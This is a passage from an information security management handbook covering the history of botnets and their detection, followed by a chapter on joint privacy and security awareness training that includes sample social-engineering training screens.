highly functional means that can be used for malicious control, generally with 
means to evade normal firewall restrictions. Even basic Internet management pro-
tocols, such as the DNS, can be used to pass information in a distributed and 
generally anonymous manner.
7.3.2.1  “Smurf” and “Fraggle”
The next development in the history of botnets was likely the expansion of DoS 
attacks with distributed components and capabilities. The first such instance was 
the smurf attack and the related fraggle attack, created in 1997, probably fairly late 
in that year. (The released source code indicates dates in October.) The concept 
behind the attacks is to use common network protocols that demand a reply, falsely 
crafting the packet sent out, to appear to come from the machine you wish to attack 
and to be addressed to a broadcast address. Thus, instead of the target machine 

84  ◾  Information Security Management Handbook
simply having to deal with packets generated by a single attack machine, a large 
number of machines on a given network segment would each “reply” to the target 
machine, and the target machine would be unable to cope with the flood of traffic. 
The names “smurf” and “fraggle” were used by the author of the original programs, 
but have since become terms for the attack concept itself.
In June 1999, the PrettyPark virus demonstrated a number of features that 
would become standard in botnet programs. Once the virus had infected a com-
puter, it announced itself on IRC servers. The software provided remote access 
capability to the infected machine as a kind of backdoor. The virus itself carried 
specific functions that could be called by the controller, but also had the ability to 
upload and execute files.
In the second half of that year, the first generation of distributed denial of ser-
vice (DDoS) zombie or agent programs were released. Trinoo, TFN (Tribe Flood 
Network), and stacheldraht (the German word for “barbed wire”) provided similar 
announcement and remote control functions, but the capabilities carried by the 
software were specific to launching certain types of network attacks. This type of 
operation made headline news the following year. In February 2000, two teenag-
ers, known by the names coolio and mafiaboy, bragged online that they could take 
down any online presence. Egged on by the suggestions of others involved in the 
discussion, they did disrupt the operations of major commercial vendors on the 
Web for periods of time.
7.3.2.2  Spambotnet Wars of 2003
During 2003, the authors (or groups of authors) of the Bagle, Netsky, and MyDoom 
virus families were building spambotnets. These viruses would infect computers, 
install SMTP servers on the infected machines, and work cooperatively to distrib-
ute spam. The spambotnets would also be used to send out new versions of the 
viruses as the old versions became well-known and detected by anti-virus programs, 
and the botnets started to shrink as machines were disinfected.
The cooperation was limited to the machines in a specific virus family and 
botnet. In the malware research field, it was interesting to track the bickering going 
on between the authors of the different virus families. Some versions were even 
designed specifically to track down, disinfect, and reinfect computers that had been 
part of a rival botnet, infected by a different virus family.
7.3.2.3  Storm
The major news in botnets during 2007 was the Storm worm, in many different 
incarnations. (The Storm appellation was a reference to one of the early distribution 
messages, spammed out with a subject line that mentioned a recent weather disaster 
in Europe.) At various times, estimates of the sheer size of the botnet was the major 
story, although subsequent research did not support the initial assertions. In the 

Botnets  ◾  85
end, probably the major notable factor of Storm was the “self- defense” capability 
that was built into later versions of it. Researchers who attempted active probing of 
the botnet found that the cluster would automatically respond by launching DDoS 
attacks against typical probing and analysis.
7.4  Protection
Botnets can be very hard to detect and determine with any certainty. The machines 
involved are many, and therefore form an amorphous target. As individual machines 
are taken down, others may take their place. Individual machines are difficult to 
determine, other than after the fact when tracing the origin of spam or attack pack-
ets. The agent software is designed to run without intervention by the legitimate 
user or owner, and may be specifically crafted to avoid detection. The agent soft-
ware may use existing network tools that are included with the operating system, 
or may replace those tools with slightly modified versions. Sometimes the attack 
software is not provided with the operating system, but the uploaded material is 
benign in itself; it is merely used in malicious ways. One of the most effective 
means of detecting botnet-connected machines within your own organization is to 
practice egress scanning: scanning, filtering, or firewalling e-mail and packets that 
originate on your network and are headed out, rather than always concentrating on 
inbound traffic.
It is difficult to find a specific signature for botnet activity because attacks and 
even control functions may be provided in a variety of ways. However, it may be 
possible to look for anomalies in the types of traffic, and particularly in the types 
of protocols, used in normal machine communications. This would be conducted 
primarily on a statistical basis on a large network.
Once an individual participant in a botnet has been determined, particular 
attention should be paid to computers in the same network. Botnet machines tend 
to cluster logically (according to similarity of IP address) and temporally. Therefore, 
examination of logically nearby machines may turn up additional candidates. 
Similarly, examination of network log data on that network may provide additional 
clues: botnet participants tend to remain active for a long period if not disinfected, 
even if the composition of the botnet changes considerably.
References and Further Reading
http://www.cbc.ca/canada/story/2000/02/15/hackers000215.html
http://www.cbc.ca/canada/story/2000/02/16/hackers000216.html
http://www.itu.int/ITU-D/cyb/cybersecurity/projects/botnet.html
http://www.nanog.org/mtg-0410/kristoff.html
http://www.theregister.co.uk/2000/04/19/canadian_feds_charge_mafiaboy/

86  ◾  Information Security Management Handbook
http://staff.washington.edu/dittrich/misc/stacheldraht.analysis
http://staff.washington.edu/dittrich/talks/cert/
http://staff.washington.edu/dittrich/talks/core02/
http://staff.washington.edu/dittrich/talks/first/
Schiller, Craig A., et al. 2007. Botnets: The Killer Web App. Rockland, Massachusetts: Syngress.
Shoch, John F. and Hupp, Jon A. 1982, The “Worm” programs—early experience with a 
distributed computation, Communications of the ACM, 25(3), 172–180.

3
Information 
Security and Risk 
Management


89
8
Chapter 
Collaborating 
Information Security 
and Privacy to Create 
Effective Awareness 
and Training
Rebecca Herold
Contents
8.1	 Introduction............................................................................................... 90
8.2	 Privacy and Information Security Education Are Necessary for 
Business Success......................................................................................... 90
8.2.1	 Lack of Education Impacts the Business Bottom Line.....................92
8.3	 Education Programs Must Be Effective.......................................................92
8.4	 Laws and Regulations Require Education...................................................93
8.5	 Common Topics..........................................................................................94
8.6	 Target Education Groups............................................................................96
8.6	 Strategies.....................................................................................................98
8.6.1	 Utilize Current Awareness and Training Programs..........................98
8.6.2	 Determine the Overall Effectiveness of Current Programs...............98
8.6.3	 Determine Current Levels of Knowledge.........................................99

90  ◾  Information Security Management Handbook
8.1  Introduction
Privacy and information security education is necessary not only to help prevent 
incidents and improve business success, but also to meet growing numbers of regula-
tory requirements for such education. There are many topics within organizations 
where both privacy and information security training and awareness must occur. 
Organizations must identify the target groups that need customized training and 
awareness communications for these topics. Organizations also need to include some 
key issues within the awareness and training strategies to collaborate information 
security and privacy initiatives most effectively. This chapter covers these issues in 
detail and then wraps up with an example of what some combined information secu-
rity and privacy training content could look like for a specific collaborative topic.
8.2  Privacy and Information Security Education 
Are Necessary for Business Success
Great business leaders see the value in providing effective information secu-
rity and privacy education to their personnel. They are not the only ones. Our 
lawmakers also see the importance of educating employees to ensure they 
provide effective safeguards for personally identifiable information (PII) and 
expect organ­izations to provide training and education to prevent the contin-
ued onslaught of privacy breaches. As Senator Charles Schumer of New York 
stated in 2007, “You [can] have the best computer system in the world, but if 
the people on the job aren’t properly trained and don’t execute their job prop-
erly, that great computer system will go for naught.”* Businesses must meet the 
*	June 1, 2007, CNN, http://transcripts.cnn.com/TRANSCRIPTS/0706/01/sitroom.03.html
8.6.4	 Consider the History of Incidents and How They Were 
Resolved..........................................................................................99
8.6.5	 Estimate the Risk of Incidents within Identified Departments 
and Teams.......................................................................................99
8.6.6	 Identify Events That Lead to Awareness Degradation......................99
8.6.7	 Document Ongoing Activities to Reinforce and Support 
Continuing Awareness and Diligence in Compliance....................100
8.6.8	 Outline Timing for Awareness and Training Activities..................100
8.6.9	 Consider Language and Regional Challenges................................100
8.6.10	Strategy Components....................................................................100
8.7	 Sample Content.........................................................................................102
8.8	 Common Information Security and Privacy Topic: Social Engineering....103
8.9	 Information Security and Privacy Education Basics..................................109

Collaborating Information Security and Privacy  ◾  91
expectations of lawmakers and the regulations they enforce, or they will face 
painful fines and penalties.
Yes, awareness and training are not only important keys to information security 
and privacy success; they are also necessary for business success. There are at least 
seven compelling reasons for business leaders to strongly support enterprisewide 
information security and privacy education programs.
	
1.	Education makes safeguards effective. You cannot expect personnel to know 
what to do if you have not told them what they should do to protect informa-
tion and systems. You cannot expect personnel to know how to handle infor-
mation securely during the course of performing their job responsibilities if 
you do not teach them how to work securely. All the security technology in 
the world will be for naught if you do not educate personnel how to use the 
technology appropriately and how to handle information securely when it is 
not in a form that technology can protect.
	
2.	Education creates accountability. When you communicate your expectation 
for information security and privacy to personnel, and they receive your mes-
sage, they then become accountable. They cannot claim ignorance for doing 
something against policy if you have documented your training and aware-
ness activities for that policy and provided the education in effective, under-
standable ways in which all levels of your personnel can understand.
	
3.	Education is necessary for compliance with regulatory requirements. 
Numerous laws and regulations require organizations to provide training 
and awareness activities. A few of these will be listed and described in a little 
more detail later in this chapter. If organizations do not provide information 
security and privacy education, they face stiff fines and penalties.
	
4.	Education is necessary for compliance with published policies. Your policies 
will not only be ineffective, they will also be virtually worthless if you do 
not provide training for them, and provide ongoing awareness about them. 
Additionally, if you do not provide education about your policies, your per-
sonnel can legally defend themselves in court saying they did not know that 
what they did was against policy.
	
5.	Education demonstrates due diligence. Training and awareness activities 
demonstrate due diligence. Even the U.S. Federal Sentencing Guidelines* 
recognize this by including consideration of whether or not formal training 
and awareness activities existed when dealing with corporate defendants.
	
6.	Education makes privacy and information security a normal part of business. 
Training and ongoing awareness messages instill information security and 
privacy into the business culture and everyday activities of your organization. 
The more you talk about information security and privacy and how they 
*	Get the full guidelines from http://www.ussc.gov/guidelin.htm.

92  ◾  Information Security Management Handbook
apply to and improve business, the more your personnel will think about how 
their actions impact security and privacy.
	
7.	Education improves customer relations. Respect for customer information pri-
vacy and security is one of the most important issues facing your company today. 
To gain and keep customer trust, your organization must exercise good judgment 
in the collection, use, and protection of customer PII. Your organization must 
protect PII from inappropriate exposure or sharing. PII must not be used for any 
purpose that was not disclosed to the individual at the time of collection.
Having a formal information security and privacy education program will help 
your personnel better understand the importance of protecting customer informa-
tion, and will in turn help them to discuss security and privacy issues most appro-
priately with your customers when they receive questions.
Your personnel must also be aware of actions they typically take with other non-
sensitive information that would put PII at great risk, such as throwing printouts 
containing PII into regular trash bins where others may see them and take them, or, 
taking printouts to their schools or churches for the classes to use as scratch paper. 
This has happened far too many times.
8.2.1  Lack of Education Impacts the Business Bottom Line
You must provide education to your personnel to expect them to use PII appro-
priately, and to protect it appropriately. All personnel (employees and contractors) 
and organizations who directly handle or impact the handling of PII should receive 
privacy and security training before performing their PII-related job responsibili-
ties, receive refresher training every year, and receive awareness communications 
on an ongoing basis.
All your organization activities must comply with applicable laws and regula-
tions. Every employee, contractor, vendor, and anyone handling your organization’s 
PII must receive information security and privacy education. They should get this 
education prior to handling PII. They should get this education not just once, on 
a poorly written memo, but through effective training sessions along with ongoing 
awareness activities and communications. If you do not educate these folks, and 
they make mistakes or do bad things, you will find yourself in some very bad situ-
ations, facing lost business, huge fines, and penalties.
8.3  Education Programs Must Be Effective
Too many organizations throw poorly designed slide presentations or unintelli-
gible memos on their intranet sites and call it education. Such actions not only 
are ineffective, they can also damage information security and privacy initiatives 
and result in a degradation of compliance from personnel who view this poor 

Collaborating Information Security and Privacy  ◾  93
education as a sign that management considers information security and privacy 
as being unimportant.
An effective education program must:
Address your organization’s interpretation of applicable privacy and security 
◾
◾
laws and regulations.
Support the activities that your organization will take to mitigate risk and 
◾
◾
ensure that security and privacy controls are based upon the results of a base-
line assessment.
Instill security and privacy habits into the everyday business culture.
◾
◾
Training sessions and ongoing awareness communications and activities help your 
personnel understand exactly what they need to do during their everyday work activ-
ities to help your company be in compliance with applicable laws and regulations.
Creation and delivery of a common message, interpretation of the regulations, 
and a process for addressing and communicating issues will speed the implementa-
tion and reduce the overall cost of information security and privacy compliance.
Along with compliance, regular training and ongoing awareness communica-
tions mitigate risk by addressing the human factor that is so often the weak link 
that breaks the security and compliance chain. Improve upon how to do this most 
effectively by maintaining metrics. Measure awareness of information security and 
privacy issues at the beginning of your education efforts, and then on an ongoing 
basis to see where you are being effective and where you need to make adjustments 
to improve security and privacy understanding.
Effective information security and privacy education will make it a constant 
thought in the back of the minds of your personnel. Just as physical safety issues are 
now commonly on the minds of personnel, so will be privacy and security issues.
8.4  Laws and Regulations Require Education
Many laws and regulations require personnel education, as shown in Table 8.1. 
All these laws and regulations represent a list of just a few of those that explicitly 
require formal, ongoing training and awareness communications for employees. 
Regulations such as the one for DOT may apply to training and awareness for 
HAZMAT employees for safety and security risks, but by knowing these require-
ments you can partner with the training coordinators for these sessions and provide 
your information security and privacy training at the same time. It is always cost 
efficient, not to mention time efficient, to provide training and awareness to per-
sonnel in partnership and collaboration with other areas whose responsibilities are 
complementary to information security and privacy.
Information security and privacy education requirements also apply to laws and 
regulations worldwide. For example, Canada’s Personal Information Protection 

94  ◾  Information Security Management Handbook
and Electronic Documents Act (PIPEDA) requires information security and pri-
vacy awareness and training. However, various studies point to the sad fact that 
most organizations are not providing this vital education in effective ways. This is 
supported by the 2007 Deloitte Global Security Survey,* which found that humans 
were the cause of 79 percent of failures of information systems in organizations 
throughout the world as a result of their lack of knowledge and subsequent mis-
takes. In another study conducted by Ekos Research Associates in March 2007,† it 
was determined that of the 67 percent of businesses that have implanted PIPEDA 
requirements in Canada, only one third had provided training to their personnel as 
is required by that law.
8.5  Common Topics
Most information security and privacy education programs are directed and pro-
vided only to internal personnel, completely ignoring the need to educate custom-
ers and third-party business partners on how to protect PII. The training content 
that is offered also tends to be decidedly high-level and generic, leaving the training 
participants with no real learning experience for how information security and 
privacy directly impact their job responsibilities.
Organizations that are in the process of developing training and awareness pro-
grams need to take into account the diverse audiences inside as well as outside 
their organizations that need to know and understand information security and 
privacy concepts. Organizations need to tailor their training content and awareness 
*	Accessed on 03/01/2008 from http://www.deloitte.com/dtt/cda/doc/content/us_fsi-Deloitte-
GlobalSecuritySurvey2007.pdf.
†	 Accessed on 03/01/2008 from http://findarticles.com/p/articles/mi_qa3937/is_200709/
ai_n21100506.
Table 8.1  Some Laws (Among Many Others) Requiring Personnel Education
HIPAA
21 CFR Part 11
Bank Protection Act
Computer Security Act
Computer Fraud and Abuse Act
Privacy Act
Freedom of Information Act
GLBA
Section 508 of the Rehabilitation Act 
of 1973
OPM Security Awareness and 
Training Regulations
DMCA
FERPA
DOT HM-232
Among many others …

Collaborating Information Security and Privacy  ◾  95
communications to meet the different needs of the various audiences. As appropri-
ate, they need to provide case studies that the audience can relate to, and not a “one 
size fits all” training program.
Information security and privacy education results also need to be measured 
using a variety of metrics. Pretraining assessments need to determine the baseline 
knowledge and understanding of the learners, assessments need to be done during 
training to ensure the message is getting through, and subsequent training assess-
ments need to occur to ensure the training participants truly did indeed increase 
their understanding of the topics covered.
Truly effective information security and privacy education can only be achieved 
through an ongoing process of learning that is meaningful, pertinent to the roles of 
your learners, and reinforces the value of the concepts being covered as they apply 
to the business.
Your information security and privacy training content and awareness commu-
nications must clearly convey that:
The organization is obligated and committed to fulfill the privacy and information 
◾◾
security expectations that it has communicated to customers and employees.
Personnel must know the privacy principles and follow the processes that 
◾
◾
support them.
Personnel must know how to protect information during the course of their 
◾
◾
daily job responsibilities.
Personnel must incorporate the privacy principles and information security 
◾
◾
safeguards into their daily job responsibilities and tasks.
Before describing the common topics between information security and privacy 
areas, it is important to know and plan for these two areas to work together to com-
municate these common messages also. When your company must meet security 
and privacy obligations, your personnel must understand that this means they must 
meet the obligations, not just few of the folks who specifically sit in the information 
security and privacy departments.
Your personnel must know the basic privacy principles that most of the data 
protection laws throughout the world are built upon. As a quick review, these basic 
principles include
Collection limitation
◾
◾
Data quality
◾
◾
Purpose specification
◾
◾
Use limitation
◾
◾
Security safeguards
◾
◾
Openness
◾
◾
Individual participation
◾
◾
Accountability
◾
◾

96  ◾  Information Security Management Handbook
Knowing these eight privacy principles will make it more effective for the pri-
vacy and information security areas to work together to identify topics common to 
each area. Table 8.2 lists some of the topics that are common within most organiza-
tions. Use the items from Table 8.2 as a starting point to help brainstorm the areas 
within your organization that have both information security and privacy require-
ments. I document 59 topics within my book, Managing an Information Security 
and Privacy Awareness and Training Program,* but this list really is unlimited; many 
unique topics will exist within each organization. For example, a topic not listed 
within Table 8.2 is the information security and privacy necessary for outsourced 
services. For this topic you should cover how to ensure that third parties will secure 
the information with which you have entrusted them, how they must respond to 
security incidents and privacy breaches, and also the types of security and safeguard 
requirements that should be included within the third-party contracts.
8.6  Target Education Groups
Training content for target groups must be specialized based on specific issues that 
they must understand to perform their job responsibilities and with which they 
must comply. Not only is this a good idea from an academic point of view, it is 
also a requirement under some laws and regulations. The course content must be 
matched to job responsibilities and roles to be most effective.
Following are some examples of the training groups that most organizations 
will have.† However, as you read through these, keep in mind that you will have 
*	Herold, R. 2005. Managing an Information Security and Privacy Awareness and Training 
Program. Auerbach Publications, pp. 126–144.
†	 Updated excerpt from Herold, R. 2005. Managing an Information Security and Privacy 
Awareness and Training Program. Auerbach Publications, pp. 124–125.
Table 8.2  Common Topics (Among Others)
Due diligence
PII, PHI, NPI, etc.
E-mail and messaging
Identity verification
Laws
Policies
Privacy impact assessments and risk assessments
Safeguards
Encryption
Procedures
Fraud identification and prevention
Website privacy policy
Marketing
Ethics
Privacy breach and security incident response
Social engineering

Collaborating Information Security and Privacy  ◾  97
unique groups for your own organization, based upon your services, products, 
industry, geographic location, size, and so on.
Customer privacy and security advocates: The personnel who are the commu-
◾
◾
nication and implementation links between your privacy and security office 
and field employees.
Executive management and privacy/security champions: The executive lead-
◾
◾
ers who sponsor the information security and privacy efforts, along with the 
business unit leaders who are championing and supporting information secu-
rity and privacy efforts.
Corporate nonemployee representatives: Contractors, consultants, and others 
◾
◾
who perform work on behalf of, or within, your company, who have access to 
your information, networks, and systems, and whose daily work your com-
pany manages.
IT personnel: The IT architects, engineers, and programmers who create, 
◾
◾
implement, and maintain your business applications and systems. They must 
know how to build-in security and privacy.
Marketers: The marketing and sales personnel who have direct contact with 
◾
◾
customers, who handle customer PII, and who must ensure that customer PII 
is properly protected.
Research & Development: The researchers and developers who create applica-
◾◾
tions, systems, and processes. They usually include business planners as well as 
IT architects and programmers. They must address security and privacy from 
the very beginning of planning and researching new applications and systems.
All employees: All your organizational personnel have basic information 
◾
◾
security and privacy responsibilities.
New employees: All new employees must know and understand the impor-
◾
◾
tance of information security and privacy from the first day they are on the 
job, and ideally before they are given access to information assets.
Trainers: In many large organizations, there are departments of personnel 
◾
◾
responsible for training delivery and development for the wide range of train-
ing topics throughout the enterprise. If these individuals deliver information 
security and privacy training, they must thoroughly understand the concepts 
for which they are providing training. If they don’t, they could significantly 
damage the security posture of the organization.
Legal and Human Resources (HR): Legal and HR staff must stay aware of 
◾
◾
privacy and security laws, regulations, and corporate issues related to privacy 
and security compliance. They need to understand how the existing tech-
nologies and policies are impacted and can be used to meet compliance.
Third parties: Suppliers, partners, and third parties contracted to perform 
◾
◾
work for your company, but whose work is managed by their employer (the 
business partner), must understand how to safeguard effectively the informa-
tion your organization has entrusted to them.

98  ◾  Information Security Management Handbook
Customer services and call centers: Call centers, customer care staff, and 
◾
◾
any other personnel who communicate with customers and consumers must 
know how to respond accurately and appropriately to questions about your 
organization’s information security and privacy practices. They must also 
know the procedures to follow to elevate customer concerns that they cannot 
address themselves.
Don’t let the list stop here. Have a brainstorming session with your team to 
identify the groups in your organization that touch PII in one way or another, 
either electronically, on paper, or verbally, and these groups will be prime candi-
dates for joint information security and privacy training.
8.6  Strategies
To make your collaboration of information security and privacy education efforts 
most effective and most cost efficient, be sure you follow some basic strategies.
8.6.1  Utilize Current Awareness and Training Programs
You often do not need to reinvent the wheel when launching a new information 
security and privacy education program. Look to see what types of other train-
ing and awareness programs are in place within your organization, such as within 
your HR area, physical security area, and even sales training area. Offer to include 
appropriate and applicable information within the existing training content and 
awareness communications within those areas. Include nuggets of security and pri-
vacy information into other training offerings, such as those the marketers receive 
for generating new leads, the call center receives for learning how to communicate 
with customers, and so on.
Also, those other areas may already have learning management systems (LMS) 
that you could utilize for any training modules you have determined you will pur-
chase; don’t buy technology if you can use some already existing systems within 
your organization.
8.6.2  Determine the Overall Effectiveness 
of Current Programs
Are existing training methods and content effective? Have existing awareness com-
munications made a measurable improvement in personnel knowledge and under-
standing? Why or why not? Use lessons learned to create your information security 
and privacy training content and awareness communications, or to improve what 
you already have in place.

Collaborating Information Security and Privacy  ◾  99
8.6.3  Determine Current Levels of Knowledge
Establish a baseline for the level of information security and privacy knowledge and 
understanding within your identified target groups. You can do this in a number of 
ways, using such things as:
Phone surveys
◾
◾
Online quizzes
◾
◾
Questionnaires
◾
◾
Competency tests
◾
◾
The methods you can use to evaluate effectiveness are diverse. Use a com-
bination of methods. Be sure to consider not only the tangible benefits such as 
reduced errors, fewer incidents, and so on, but also evaluate the many different 
intangibles such as increased job satisfaction, fewer employee complaints and 
grievances, reduced employee turnover, increased innovation, increased customer 
satisfaction, better community and investor image, increased customer loyalty, 
and so many others.
8.6.4  Consider the History of Incidents and 
How They Were Resolved
What incidents related to information security and privacy have occurred in the 
past few years? Why did they occur? Could better understanding and knowledge 
have prevented them? Were the incidents resolved and changes made to help ensure 
that they do not reoccur? Look at lessons learned and be sure to incorporate infor-
mation for preventing future similar incidents into the information security and 
privacy training content and awareness communications.
8.6.5  Estimate the Risk of Incidents within 
Identified Departments and Teams
Now that you’ve identified your target groups, look at the risks to information 
assets and PII within those groups. What job responsibilities do they perform that 
put PII at risk? What technologies may expose PII? What policies and procedures 
do they have in place to protect the organization’s information assets? Where are 
improvements needed? Incorporate information to help increase the security of PII 
into your training content and awareness communications.
8.6.6  Identify Events That Lead to Awareness Degradation
Often, changes in the organization’s goals and environment will result in per-
sonnel being less aware of information security and privacy awareness. Is your 

100  ◾  Information Security Management Handbook
company going through a downsizing period? Is it launching a new product or 
new Website? Perhaps your organization has acquired another business? Is it in a 
different state or country? As your organization changes, new information secu-
rity and privacy threats and vulnerabilities will be created, which will result in a 
decreased level of awareness among your personnel. Bring this awareness back up 
by including information about these new risks within your training content and 
awareness communications.
8.6.7  Document Ongoing Activities to Reinforce and Support 
Continuing Awareness and Diligence in Compliance
You must keep track of what you are doing with information security and privacy 
education to be able to improve your education. Document all your training events, 
content, and awareness communications. Keep track of your feedback and evalua-
tion. Monitor your awareness levels and evaluation results.
8.6.8  Outline Timing for Awareness and Training Activities
You must plan ahead for your training and awareness events to make them as effec-
tive and successful as possible. You must look ahead on the calendar and make 
sure that there is no conflicting event planned for the same time you want to do 
your education event. The first event I planned many years ago coincided with the 
company’s planned event for international AIDS awareness day; I did not realize 
this when I made the plans. Having my awareness speaker come in for a planned 
talk at the same time the HR department was providing their program out in the 
campus plaza giving away free ice cream and cake dramatically reduced the number 
of attendees at the information security awareness event.
8.6.9  Consider Language and Regional Challenges
Your training content and awareness communications will have no positive impact 
upon personnel who do not speak the language in which you provide them, and if 
you use concepts, idioms, and examples to which they cannot relate, do not under-
stand, or find offensive in the context of their background and culture. Be sure 
that your information security and privacy education materials take into account 
the diversity of your personnel and others to whom you are providing training and 
awareness communications.
8.6.10  Strategy Components
Your information security and privacy education strategy should include the fol-
lowing components:

Collaborating Information Security and Privacy  ◾  101
Strong and visible executive management support: You 
◾
◾
must have strong 
executive management support to be successful in your efforts. This is sup-
ported by numerous studies, including one from Auburn University and 
the International Information Systems Security Certification Consortium* 
that shows top management support is necessary for successful informa-
tion security initiatives. This support will allow you to obtain the resources 
necessary to have a fully functional and effective education program.
Risk assessment: Perform an information security and privacy training 
◾
◾
and awareness risk assessment to identify training and awareness compli-
ance gaps and form the baseline to use for measuring future compliance 
success.
Objectives: Create tactical objectives for the training and awareness 
◾
◾
program.
Policies and procedures: Develop, implement, communicate, and enforce 
◾
◾
information security and privacy education policies and procedures to miti-
gate risk and ensure not only risk reduction, but also ongoing compliance 
with applicable laws, regulations, standards, and policies.
Sufficient budget: You must have a budget that accounts for the communica-
◾
◾
tions, planning, and implementation activities that will be proportionate to 
this piece of the total amount of the regulatory compliance, IT, privacy, and 
information security budget.
Documented time line: A time line indicating target dates for all phases of 
◾
◾
the information security and privacy education program are necessary.
Evaluation methods: Procedures and tools for measuring the overall effec-
◾
◾
tiveness of the training and awareness program will be needed during the 
evaluation phase.
Integration points: Identify integration points and implementation time 
◾
◾
frames to coordinate the information security and privacy awareness and 
education practices effectively within the overall enterprise education plan.
Departmental strategy: Create a strategy to integrate the information secu-
◾
◾
rity and privacy training and awareness processes throughout each of the 
enterprise departments and teams to help ensure that all personnel receive 
education.
You must ensure that you educate not only specific target groups, but you 
also need to ensure that information security and privacy awareness are perva-
sive throughout your entire organization, at all levels. Always keep in mind that 
it takes just one person, from anywhere within your organization, to cause an 
incident because of a mistake or lack of knowledge or understanding. By making 
security and privacy an integral part of work activities, your personnel will better 
*	Accessed on 03.03.2008 from https://www.isc2.org/download/auburn_study2005.pdf.

102  ◾  Information Security Management Handbook
safeguard information. You should create and maintain an attendance record to 
ensure that all personnel are involved.
8.7  Sample Content
Over the years I have seen a lot of training content, and an overwhelmingly large 
amount of it is bad and ineffective! It is important that the content you use is as 
effective as possible and reaches as many personnel as possible. Most organizations 
really have little to no experience in creating training content and no education 
background to allow them to create content that is effective. Too many organiza-
tions purchase content from vendors who also have no educational basis for their 
training modules, and even though the training may be flashy and expensive, it 
does not increase information security or privacy knowledge. These sub-par, so-
called training modules have made it even harder for practitioners to justify the 
need and resources for good information security and privacy education.
For the rest of this chapter I will step you through a sample of how you can 
address both information security and privacy within your training content. I chose 
the training topic “social engineering” for multiple reasons:
It is being used within increasing numbers of security and privacy breaches, 
◾
◾
and very few organizations provide any training about it.
It is important to keep in mind as we go through this that it is just one train-
◾
◾
ing session that should be part of other training sessions and ongoing aware-
ness communications and activities.
It is a topic that would also be beneficial to provide classroom training for, to 
◾
◾
allow participants to do role-playing and case studies.
Take this content and modify it to fit within your own organization. Use 
it within whatever learning management systems you have in place, or even 
PowerPoint presentations if that is what you use for computer-based training. I 
am providing this content to you in one of the types of formats I often use when I 
create training content for organizations. I like to show not only the text, but also 
describe the graphics to use.
When creating your training content, keep in mind there are generally three 
types of learners:
	
1.	Auditory: Individuals who learn best by listening.
	
2.	Visual: Individuals who learn best by seeing.
	
3.	Kinesthetic: Individuals who learn best through interaction and hands-on 
activities.
Have a goal of communicating to all three of these types of learners, not just the 
visual learner, which typically most computer-based training modules do.

Collaborating Information Security and Privacy  ◾  103
8.8  Common Information Security and 
Privacy Topic: Social Engineering
Why provide training about social engineering within your information security 
and privacy education program? Because social engineering leads to security 
incidents and privacy breaches, and all personnel are susceptible to social engi-
neering exploits.
Start off with a real example, such as the one shown in Screen 1. Learners 
usually relate to real incidents better than to hypothetical situations; they feel as 
though this real event could have happened to them.
SCREEN 1
On-Screen Text
Individuals identifying themselves as being with the U.S. Internal Revenue 
Service (IRS) are telephoning people and telling them that they are under 
consideration for an audit. To help the IRS narrow down their decision, they 
are asking the people to verify their names, Social Security numbers, and then 
the bogus IRS callers also ask for credit card numbers supposedly so they can 
determine if the information is consistent with what the IRS has on file. If it is 
not consistent, then it is likely they will be flagged for an audit.
This demonstrates just one of the many ways that criminals use social 
engineering techniques to obtain personally identifiable information to 
commit fraud, steal identity, and any number of bad things.
Graphics
Show two people on the phone talking; one looking nervous, and the other looking 
similar to Snidely Whiplash.
After catching their attention, define the topic you are covering in Screen 2. 
Don’t assume everyone has the same definition for terminology that you think 
should be common.
SCREEN 2
On-Screen Text
What is social engineering?
Social engineering is when a criminal uses psychology to trick a victim into 
trusting the criminal, and understanding human tendencies, ultimately to 
obtain sensitive information. Basically, it is getting people to do what they 
wouldn’t ordinarily do for a stranger, and taking advantage of humans doing 
careless things with sensitive information.

104  ◾  Information Security Management Handbook
Graphics
Show several images representative of the social engineering methods that will be 
covered.
Because there are so many different ways in which social engineering can be 
done, go over the most common ways that could occur within your organization. 
This applies to any topic you are covering. Also, incorporate graphics to which your 
particular organization can best relate. Consider using photos of your employees in 
these situations, if that would work best for your organization. Think about other 
alternative situations you could graphically represent. Incorporate an audio file of 
the conversation that could occur in this situation for your auditory learners. Add 
an activity for your kinesthetic learners, such as presenting them with options for 
responding to such a call, and then having the learner choose the one he or she 
would do.
You may want to start with covering social engineering attempts that occur by 
phone, as shown in Screen 3.
SCREEN 3
On-Screen Text
Social engineering by phone
One of the most commonly known techniques is calling someone and 
pretending to be someone else, usually with authority. The criminal first gains 
the trust or sympathy of the person at the other end of the phone line by 
pretending to be someone in need of help. This trust gained is used to extract 
the required information. It is also common for the caller to pretend to be 
someone in authority to intimidate the person into divulging information.
Example: Someone calls your help desk saying he is your company’s CEO, that 
he is in an important meeting and needs to get to some information, but has 
lost his password and needs to have a new password ASAP or the help desk 
worker will face termination.
Graphics
Show an illustration of a suspicious-looking person in front of a computer, typing on 
the keyboard and speaking on the telephone.
Some suggestions that apply for the dumpster diving technique are shown in 
Screen 4. Do you have a drawing or photo of the actual dumpster areas for your 
organization? Use them! Have you had an actual situation like this occur? Modify 
the text to describe it!

Collaborating Information Security and Privacy  ◾  105
SCREEN 4
On-Screen Text
Dumpster diving
“Dumpster diving,” also sometimes called “trashing,” is when criminals search 
through trash bins and waste cans to find sensitive information, or information 
that the criminal can use to appear more knowledgeable about the company 
or the company’s procedures.
Divers look for information such as personally identifiable information (PII) of 
customers or employees, printouts of sensitive data or log-in names and 
passwords, lists of internal extension numbers, disks and tapes with company 
information, internal memos, old hardware, and printouts of source codes.
Graphics
Show an illustration of a suspicious-looking person going through the trash 
dumpster in an alley.
Screen 5 covers social engineering over the Internet. Here you can use some 
of the actual messages your organization has received as the graphics. Provide 
real statistics about them from your company’s recent experience. Provide a 
screen that requires the learner to click on a link within a phishing message, 
which produces a pop-up screen at a bogus site. Use prominently placed arrows 
to point out the characteristics that should be flags to the learner that the site 
is bogus.
SCREEN 5
On-Screen Text
Internet social engineering
A criminal can use instant messaging services and e-mail to contact victims 
and socially engineer them, such as through phishing messages. The criminal 
might manage to get the victim’s log-in name and password for a mail account 
or a jobsite account. Many users use the same log-in name and password for 
every account. This could mean access to Internet banking, online money 
transfer services such as PayPal, and so on. Criminals may also be able to get 
credit card numbers, Social Security numbers, or other sensitive personally 
identifiable information (PII).
Graphics
Show an illustration of a suspicious-looking person sending e-mail.

106  ◾  Information Security Management Handbook
Another type of social engineering scheme to cover is shoulder surfing, as shown 
in Screen 6. Do you have an ATM machine in your building? Another option is to 
take some photos of people shoulder surfing there. Another engaging option is to 
take a short, 10- or 15-second video at the ATM machine showing shoulder surfing 
in action. Be creative; you can think of more!
SCREEN 6
On-Screen Text
